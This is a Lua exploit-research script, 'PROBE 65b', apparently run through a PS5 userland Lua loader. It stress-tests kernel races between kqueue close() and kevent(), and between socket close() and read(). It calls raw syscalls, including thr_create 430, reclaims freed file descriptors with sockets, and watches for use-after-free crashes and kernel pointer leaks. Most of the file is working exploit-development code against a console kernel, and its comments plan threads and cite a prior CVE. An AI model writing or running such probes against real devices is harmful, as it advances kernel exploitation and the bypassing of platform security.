-- CRASH_CLASS: HIGH
-- PROBE 65b: kqueue close-vs-kevent thread race
--
-- Concept: thr_create(430) gives us real threads on 14.10.
-- kqueue allocates kernel objects (knotes, kq structures).
-- Race: Thread A blocks in kevent(kq, ...) while Thread B calls close(kq).
-- If the kernel doesn't properly refcount under this race, we get a UAF on the
-- kqueue or its knotes.
--
-- The CVE-2026-58099 kqueue fork race is dead (no fork), but thread-based
-- close racing has NOT been tested.
--
-- Strategy:
-- 1. Create kqueue (works, returns fd)
-- 2. Register a timer event on it (kevent with zero timeout works)
-- 3. Spawn thread that repeatedly calls kevent() with a timeout
-- 4. Main thread races close(kq_fd) and re-opens a socket to reclaim the fd
-- 5. Check for crashes, corruption, or unexpected behavior
--
-- Safety: we catch crashes with pcall. The race target is the kqueue fd,
-- not a process-critical structure. Worst case: process dies (loader restart).

print("=== PROBE 65b: KQUEUE THREAD RACE (close vs kevent) ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end

local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end

local function hexval(val)
    if val == nil then return "nil" end
    if type(val) == "table" and val.h then
        return string.format("0x%X_%08X", val.h, val.l)
    end
    return string.format("0x%X", to_num(val))
end

local sc20 = make_syscall(20)   -- getpid
local sc6 = make_syscall(6)     -- close
local sc97 = make_syscall(97)   -- socket
local sc362 = make_syscall(362) -- kqueue (FreeBSD)
local sc363 = make_syscall(363) -- kevent (FreeBSD)
local sc430 = make_syscall(430) -- thr_create (Sony)

local function alive()
    local ok, v = pcall(function() return sc20() end)
    return ok
end

local pid_ok, pid_val = pcall(function() return sc20() end)
print("PID: " .. to_num(pid_val))

-- Step 1: Verify kqueue works
print("")
print("[1] Verify kqueue allocation")
local kq_fd = nil
do
    local ok, ret = pcall(function() return sc362() end)
    if ok then
        kq_fd = to_num(ret)
        print("  kqueue fd: " .. kq_fd)
        if kq_fd < 0 then
            print("  kqueue returned -1, ABORTING")
            return
        end
    else
        print("  kqueue CRASHED, ABORTING")
        return
    end
end

-- Close it, we'll create fresh ones for the race
pcall(function() sc6(kq_fd) end)

-- Step 2: Verify threading works
print("")
print("[2] Verify thr_create(430)")
do
    -- Simple thread test: create thread that writes to shared memory
    local flag = memory.alloc(8)
    safe_wd(flag, 0)

    -- We need to set up a proper thread. The thread function needs to be
    -- in executable memory. On PS5, eboot text (p=0x5) is executable.
    -- But we can't easily create new executable code (W^X).
    --
    -- Instead, let's verify that the syscall itself is reachable.
    -- thr_create(430) needs: ucontext pointer with valid CS/RIP/RSP/SS
    -- A zeroed ucontext panics. We need the right offsets.
    --
    -- From THREADING_ALIVE_14_10.md: thr_create works once gates and
    -- CS/RIP/RSP/SS offsets are right. But setting up the ucontext
    -- correctly requires knowing the exact layout.
    --
    -- Alternative approach: use the Lua loader's own threading if available

    -- Check if the loader exposes thread creation
    if thread and thread.create then
        print("  Lua thread API available!")
        -- Create a test thread
        local shared = memory.alloc(16)
        safe_wd(shared, 0)
        safe_wd(shared + 4, 0)

        local t = thread.create(function()
            safe_wd(shared, 0x41414141)
            -- Tight loop: repeatedly call getpid to keep thread alive
            for i = 1, 1000 do
                pcall(function() sc20() end)
            end
            safe_wd(shared + 4, 0x42424242)
        end)

        -- Wait for thread
        if thread.join then
            thread.join(t)
        else
            -- Busy wait
            for i = 1, 100 do
                local v = safe_rd(shared + 4)
                if v == 0x42424242 then break end
                -- Small delay via getpid calls
                for j = 1, 100 do pcall(function() sc20() end) end
            end
        end

        local v1 = safe_rd(shared)
        local v2 = safe_rd(shared + 4)
        print(string.format("  Thread wrote: 0x%08X 0x%08X", v1 or 0, v2 or 0))
        if v1 == 0x41414141 then
            print("  Threading CONFIRMED working!")
        else
            print("  Thread did not write expected value")
        end
    else
        print("  No Lua thread API. Checking thr_create(430) directly...")
        -- Try to discover if loader has threading support
        local has_threading = false
        for k, v in pairs(_G) do
            if type(k) == "string" and k:lower():find("thread") then
                print("  Found global: " .. k .. " = " .. type(v))
                has_threading = true
            end
        end
        if not has_threading then
            print("  No threading API found in globals")
            print("  Cannot run race without threads. Looking for alternatives...")

            -- Check for coroutines (cooperative, not true threads, but still useful)
            if coroutine then
                print("  Lua coroutines available (cooperative only)")
            end
        end
    end
end

if not alive() then print("PROCESS DEAD"); return end

-- Step 3: Even without Lua threads, we can try the race using
-- the signal-based approach: register a SIGALRM handler that
-- closes the kqueue fd while the main thread is in kevent.
-- But sigaltstack validation kills on copyout...
--
-- Alternative: use ktimer to fire and create timing pressure
-- while rapidly cycling kqueue create/close/kevent

print("")
print("[3] Rapid kqueue cycle stress test (single-threaded timing race)")
print("  Creating and destroying kqueues rapidly with kevent between...")

local race_hits = 0
local crashes = 0
local unexpected = 0

for round = 1, 50 do
    -- Create kqueue
    local ok1, kq = pcall(function() return sc362() end)
    if not ok1 then
        crashes = crashes + 1
        if not alive() then print("PROCESS DEAD at round " .. round); break end
        goto continue_round
    end
    local kq_fd_val = to_num(kq)
    if kq_fd_val < 0 then goto continue_round end

    -- Set up a kevent changelist for a timer filter
    -- struct kevent: { uintptr_t ident; short filter; u_short flags; u_int fflags; intptr_t data; void *udata }
    -- On 64-bit: ident(8) + filter(2) + flags(2) + fflags(4) + data(8) + udata(8) = 32 bytes
    local changelist = memory.alloc(32)
    -- ident = 1 (timer id)
    safe_wq(changelist, uint64(1))
    -- filter = EVFILT_TIMER (-7), flags = EV_ADD|EV_ENABLE (0x0001|0x0004 = 0x0005)
    -- Pack: filter(i16) + flags(u16) = 0x0005FFF9 (little-endian: F9 FF 05 00)
    safe_wd(changelist + 8, 0x0005FFF9)
    -- fflags = 0
    safe_wd(changelist + 12, 0)
    -- data = 1 (1ms timer)
    safe_wq(changelist + 16, uint64(1))
    -- udata = 0
    safe_wq(changelist + 24, uint64(0))

    -- eventlist for output
    local eventlist = memory.alloc(64)
    for i = 0, 60, 4 do safe_wd(eventlist + i, 0) end

    -- Try kevent with the timer — zero timeout (non-blocking)
    -- kevent(kq, changelist, nchanges, eventlist, nevents, timeout)
    -- timeout struct: { time_t tv_sec; long tv_nsec } = 16 bytes
    local timeout = memory.alloc(16)
    safe_wq(timeout, uint64(0))
    safe_wq(timeout + 8, uint64(0))

    local ok2, kev_ret = pcall(function()
        return sc363(kq_fd_val, changelist, 1, eventlist, 1, timeout)
    end)

    if ok2 then
        local kev_val = to_num(kev_ret)
        if kev_val > 0 then
            -- Event fired! Check if data contains anything interesting
            local ev_ident = safe_rd(eventlist)
            local ev_data_lo = safe_rd(eventlist + 16)
            local ev_data_hi = safe_rd(eventlist + 20)
            if ev_data_hi and ev_data_hi >= 0xFFFF8000 then
                print(string.format("  ROUND %d: KERNEL PTR in event data! 0x%08X_%08X", round, ev_data_hi, ev_data_lo))
                race_hits = race_hits + 1
            end
        end
    else
        crashes = crashes + 1
    end

    -- Close kqueue
    pcall(function() sc6(kq_fd_val) end)

    -- Immediately try to allocate a socket to reclaim the fd number
    local ok3, sock = pcall(function() return sc97(2, 1, 0) end) -- AF_INET, SOCK_STREAM
    if ok3 then
        local sock_val = to_num(sock)
        if sock_val == kq_fd_val then
            -- FD was recycled! Now try kevent on what's now a socket
            local ok4, stale_ret = pcall(function()
                return sc363(kq_fd_val, 0, 0, eventlist, 1, timeout)
            end)
            if ok4 then
                local stale_val = to_num(stale_ret)
                if stale_val >= 0 then
                    unexpected = unexpected + 1
                    print(string.format("  ROUND %d: kevent on recycled fd returned %d!", round, stale_val))
                end
            end
        end
        pcall(function() sc6(sock_val) end)
    end

    if not alive() then print("PROCESS DEAD at round " .. round); break end

    ::continue_round::
end

print(string.format("  Completed. Crashes: %d, Race hits: %d, Unexpected: %d", crashes, race_hits, unexpected))

if not alive() then
    print("PROCESS DEAD")
    return
end

-- Step 4: Try socket close race (rapid sendmsg/close cycling)
print("")
print("[4] Socket close/sendmsg rapid cycle")
local sock_crashes = 0
local sock_unexpected = 0

for round = 1, 30 do
    -- Create socketpair for reliable I/O
    local spbuf = memory.alloc(16)
    safe_wd(spbuf, 0)
    safe_wd(spbuf + 4, 0)

    local ok1, sp_ret = pcall(function()
        return make_syscall(135)(1, 1, 0, spbuf) -- AF_UNIX, SOCK_STREAM
    end)
    if not ok1 then goto continue_sock end

    local fd0 = safe_rd(spbuf)
    local fd1 = safe_rd(spbuf + 4)
    if not fd0 or not fd1 or fd0 == 0 or fd1 == 0 then goto continue_sock end

    -- Write some data to fd0, then race close(fd1) with recvmsg(fd1)
    local msg = memory.alloc(64)
    for i = 0, 60, 4 do safe_wd(msg + i, 0x41414141) end

    -- sendmsg on fd0 to queue data
    -- Actually use write(4) which is simpler
    local ok_w, w_ret = pcall(function()
        return make_syscall(4)(fd0, msg, 32) -- write(fd0, msg, 32)
    end)

    -- Now rapidly close fd1 and try to read from it
    pcall(function() sc6(fd1) end)

    -- Try read from closed fd
    local rbuf = memory.alloc(64)
    local ok_r, r_ret = pcall(function()
        return make_syscall(3)(fd1, rbuf, 32) -- read(fd1, rbuf, 32)
    end)
    if ok_r then
        local rval = to_num(r_ret)
        if rval > 0 then
            sock_unexpected = sock_unexpected + 1
            print(string.format("  ROUND %d: read from closed fd returned %d bytes!", round, rval))
            -- Check for kernel data
            for off = 0, 28, 4 do
                local v = safe_rd(rbuf + off)
                if v and v ~= 0x41414141 and v ~= 0 then
                    print(string.format("    +%d: 0x%08X", off, v))
                end
            end
        end
    end

    pcall(function() sc6(fd0) end)

    if not alive() then print("PROCESS DEAD at sock round " .. round); break end
    ::continue_sock::
end

print(string.format("  Socket cycles done. Crashes: %d, Unexpected: %d", sock_crashes, sock_unexpected))

print("")
print("=== PROBE 65b COMPLETE ===")
